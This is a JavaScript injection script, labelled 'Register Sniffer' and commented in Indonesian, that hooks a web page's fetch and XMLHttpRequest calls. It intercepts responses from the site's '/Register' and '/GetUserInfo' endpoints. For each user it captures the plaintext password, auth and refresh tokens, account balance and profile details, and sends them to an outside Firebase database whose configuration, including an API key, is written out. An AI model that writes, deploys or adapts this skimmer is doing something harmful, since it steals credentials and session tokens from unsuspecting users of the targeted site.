(function() {
  console.log("🔥 Register Sniffer (Sukses/Gagal) Active");

  // ===== Firebase Config =====
  const firebaseConfig = {
    apiKey: "AIzaSyDtZxsl5LZp3n1KZJfdVAdqQj22ZBPoQbU",
    authDomain: "steady-fin-368617.firebaseapp.com",
    databaseURL: "https://steady-fin-368617-default-rtdb.firebaseio.com",
    projectId: "steady-fin-368617",
    storageBucket: "steady-fin-368617.firebasestorage.app",
    messagingSenderId: "626971902484",
    appId: "1:626971902484:web:98f7cdbd55c5990dfe9d01",
    measurementId: "G-70D3LR995Y"
  };

  // Load Firebase
  const s = document.createElement("script");
  s.src = "https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js";
  document.head.appendChild(s);

  const s2 = document.createElement("script");
  s2.src = "https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js";
  document.head.appendChild(s2);

  s2.onload = () => {
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function saveUser(userId, data) {
      if (!userId) return;
      db.ref("uids/" + userId).update({
        ...data,
        updated: Date.now()
      });
      console.log("✅ User data saved for UID:", userId);
    }

    // ===== Handler Register =====
    function handleRegisterResponse(data, requestBody) {
      const code = data.code;
      const msg = data.msg || '';
      const msgCode = data.msgCode;

      // Sukses: code === 0 dan ada token
      if (code === 0 && data.data && data.data.token) {
        const token = data.data.token;
        try {
          const payload = JSON.parse(atob(token.split('.')[1]));
          const userId = payload.UserId;
          if (userId) {
            const password = (requestBody && requestBody.pwd) || '';
            saveUser(userId, {
              nickName: payload.NickName || '',
              userName: payload.UserName || '',
              parentUserId: data.data.parentUserId || '',
              parentInviteCode: data.data.parentInviteCode || '',
              token: token,
              refreshToken: data.data.refreshToken || '',
              expiresIn: data.data.expiresIn || 0,
              tokenType: payload.TokenType || '',
              role: payload.role || '',
              pwd: password,  // <-- field password disimpan sebagai "pwd"
              regTime: payload.LoginTime || '',
              registerType: requestBody ? requestBody.registerType : '',
              active: true,
              status: 1
            });
            console.log(`✅ Register SUCCESS: ${userId} saved with pwd.`);
          } else {
            console.warn("Register sukses tapi tidak ada UserId di token.");
          }
        } catch(e) {
          console.warn("Gagal decode token Register", e);
        }
      } else {
        // Gagal: log saja, tidak simpan
        console.log(`❌ Register FAILED: code=${code}, msg="${msg}", msgCode=${msgCode}`);
        // Opsional: simpan ke node terpisah untuk analisis
        // db.ref("register_failures").push({ data, requestBody, timestamp: Date.now() });
      }
    }

    // ===== Hook FETCH =====
    const origFetch = window.fetch;
    window.fetch = async (...args) => {
      const [url, options] = args;
      let requestBody = null;
      if (typeof url === 'string' && url.includes('/Register') && options && options.body) {
        try {
          requestBody = JSON.parse(options.body);
        } catch(e) {}
      }

      const res = await origFetch(...args);
      const clone = res.clone();
      const contentType = res.headers.get('content-type') || '';
      if (contentType.includes('application/json')) {
        clone.json().then(data => {
          if (typeof url === 'string' && url.includes('/Register')) {
            handleRegisterResponse(data, requestBody);
          }
          if (typeof url === 'string' && url.includes('/GetUserInfo')) {
            handleGetUserInfo(data);
          }
        }).catch(() => {});
      }
      return res;
    };

    // ===== Hook XHR =====
    const origOpen = XMLHttpRequest.prototype.open;
    const origSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.open = function(method, url) {
      this._url = url;
      this._method = method;
      origOpen.apply(this, arguments);
    };
    XMLHttpRequest.prototype.send = function(body) {
      const self = this;
      let requestBody = null;
      if (self._method === 'POST' && self._url && self._url.includes('/Register') && body) {
        try {
          requestBody = JSON.parse(body);
        } catch(e) {}
      }
      this.addEventListener("load", function() {
        const contentType = this.getResponseHeader('content-type') || '';
        if (contentType.includes('application/json')) {
          try {
            const data = JSON.parse(this.responseText);
            if (self._url && self._url.includes('/Register')) {
              handleRegisterResponse(data, requestBody);
            }
            if (self._url && self._url.includes('/GetUserInfo')) {
              handleGetUserInfo(data);
            }
          } catch(e) {}
        }
      });
      origSend.call(this, body);
    };

    // ===== Handler GetUserInfo =====
    function handleGetUserInfo(data) {
      if (!data || data.code !== 0) return;
      const userData = data.data;
      if (!userData || !userData.userId) return;
      const userId = userData.userId.toString();

      // Update data tambahan (tanpa menyentuh field pwd)
      db.ref("uids/" + userId).update({
        nickName: userData.nickName || '',
        userName: userData.userName || '',
        amount: userData.amount || 0,
        integral: userData.integral || 0,
        userPhoto: userData.userPhoto || '',
        regType: userData.regType || 0,
        addTime: userData.addTime || '',
        userLoginDate: userData.userLoginDate || '',
        sign: userData.sign || '',
        keyCode: userData.keyCode || '',
        isvalidator: userData.isvalidator || 0,
        updated: Date.now()
      });
      console.log("✅ GetUserInfo data updated for UID:", userId);
    }

    console.log("🚀 Firebase & Register Handler (field pwd) siap.");
  };
})();
